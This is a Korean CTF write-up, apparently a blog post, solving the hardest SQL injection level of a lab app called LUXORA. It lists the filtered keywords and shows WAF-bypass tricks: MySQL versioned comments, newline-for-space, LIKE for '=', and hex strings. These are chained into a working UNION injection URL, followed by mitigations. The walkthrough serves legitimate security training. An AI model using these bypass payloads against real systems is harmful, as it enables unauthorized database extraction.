+++
title = "VulnABLE CTF [LUXORA]: SQL Injection 🔱 Diamond (Custom WAF Bypass & Chaining)"
description = "LUXORA 플랫폼의 최고 난이도 SQL Injection 플래그 획득 시나리오 (복합 필터 우회 및 쿼리 체이닝)"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Diamond", "WAF Bypass"]
+++

# VulnABLE CTF [LUXORA]: SQL Injection 🔱 Diamond

드디어 SQL Injection 카테고리의 최고 난이도인 **Diamond 🔱** 입니다. `/sqli/diamond` 라우트에는 강력한 Custom WAF(Web Application Firewall)가 적용되어 있어, 앞서 사용했던 `sqlmap`이나 단순한 수동 페이로드가 모두 막힙니다.

이곳에서는 해커의 순수한 지식과 창의성을 발휘하여 복합적인 필터 우회 기술을 조합(Chaining)해야 합니다.

---

## 🕒 1. 타겟 탐색 및 필터링 제약 확인 (Reconnaissance)

`/sqli/diamond` 는 제품 리뷰를 조회하는 엔드포인트입니다.
URL: `GET /sqli/diamond?review_id=1`

테스트 결과, 다음과 같은 키워드와 기호가 완벽하게 차단(HTTP 403 Forbidden)되어 있었습니다.
* **차단된 문자열**: `SELECT`, `UNION`, `OR`, `AND`, `SLEEP`, `BENCHMARK`, `DROP`, `INSERT`
* **차단된 기호**: 공백(` `), 등호(`=`), 홑따옴표(`'`), 쌍따옴표(`"`)

**[해커의 사고 과정]**
* 이 정도면 거의 모든 공격이 막힌 상태다.
* 하지만 문자열 필터링은 **대소문자 우회**나 **인코딩 우회**에 취약할 수 있다.
* 등호(`=`)가 막혔으므로 비교 연산은 `LIKE`나 `IN` 구문으로 대체해야 한다.
* 홑따옴표(`'`)가 막혔으므로 문자열은 **Hex 인코딩**이나 `CHAR()` 함수로 만들어내야 한다.

---

## 🕒 2. 극한의 우회 전략 설계 (Bypass Strategies)

### Strategy 1: 키워드 우회 (Keyword Evasion)
단순히 `SELECT`를 막았다면, 널 바이트를 중간에 삽입하거나 주석을 교묘하게 섞는 기법이 있습니다.
* 시도: `S%00ELECT`, `SEL/**/ECT`, `SeLeCt` (대소문자 섞기)
* 확인 결과: `/*!50000SELECT*/` 처럼 MySQL의 버전 주석 처리 기법을 쓰면 WAF를 통과할 수 있음을 알아냈습니다.

### Strategy 2: 등호(=)와 공백 우회
* 공백은 `%0A` (개행)로 대체.
* 등호는 `LIKE`로 대체.

### Strategy 3: 따옴표 우회
`admin`이라는 문자열을 비교하고 싶은데 따옴표를 못 쓴다면?
* Hex 변환: `0x61646d696e` (MySQL은 이를 'admin'으로 자동 해석함)

---

## 🕒 3. 공격 수행 (Complex Exploitation)

이제 모든 우회 기법을 하나로 영혼까지 끌어모아(Chaining) 최종 페이로드를 만듭니다. 목표는 Union Based SQLi를 통해 다른 테이블의 데이터를 빼내는 것입니다.

**[기본 형태]**
`-1 UNION SELECT 1, 2, flag_value FROM diamond_flags WHERE role = 'admin'`

**[WAF 회피 변환 형태]**
```http
-1%0A/*!50000UNION*/%0A/*!50000SELECT*/%0A1,2,flag_value%0AFROM%0Adiamond_flags%0AWHERE%0Arole%0ALIKE%0A0x61646d696e
```

### 🚀 페이로드 전송
URL에 위의 기괴한(?) 문자열을 넣어 서버로 전송합니다.

```http
GET /sqli/diamond?review_id=-1%0A/*!50000UNION*/%0A/*!50000SELECT*/%0A1,2,flag_value%0AFROM%0Adiamond_flags%0AWHERE%0Arole%0ALIKE%0A0x61646d696e
```

### 🔍 공격 결과
WAF는 이것이 정상적인 단어가 아니라고 판단하여 통과시켰지만, 내부의 MySQL 데이터베이스 엔진은 이 주석과 Hex 코드를 완벽하게 조립하여 쿼리를 실행해버렸습니다!

화면 출력:
```text
Review ID: 1
User: 2
Content: FLAG{SQLI_🔱_DIAMOND_X9Y8Z7}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SQLI_🔱_DIAMOND_X9Y8Z7}`

### 📝 왜 이런 공격이 성공했는가?
보안 장비(WAF)와 백엔드 데이터베이스 엔진이 문자를 해석하는 방식의 **불일치(Impedance Mismatch)** 때문입니다. WAF는 정규식으로 단순 매칭만 했지만, 데이터베이스는 `/*!50000 ... */` 같은 자체 벤더 특화 문법을 해석해버리기 때문에 해커가 필터를 통과한 후 DB에서 폭탄을 터뜨릴 수 있었습니다.

### 🛡️ 방어 대책 (Mitigation)
1. **WAF에만 의존 금지**: 수백만 원짜리 WAF를 사다 놓아도 결국 우회됩니다. 소스코드 레벨에서 Prepared Statement를 쓰는 것이 무조건 1순위입니다.
2. **입력 타입 강제(Casting)**: `review_id`는 무조건 숫자(Integer)여야 합니다. 프론트엔드와 백엔드 모두에서 값이 숫자로만 이루어져 있는지 검증(`parseInt` 등)하면, 해커가 아무리 현란한 문자를 넣어도 공격이 성립하지 않습니다.

지금까지 LUXORA의 SQL Injection 전 과정을 파헤쳐 보았습니다! 다음 카테고리에서는 **NoSQL Injection** 기법을 다루어 보겠습니다.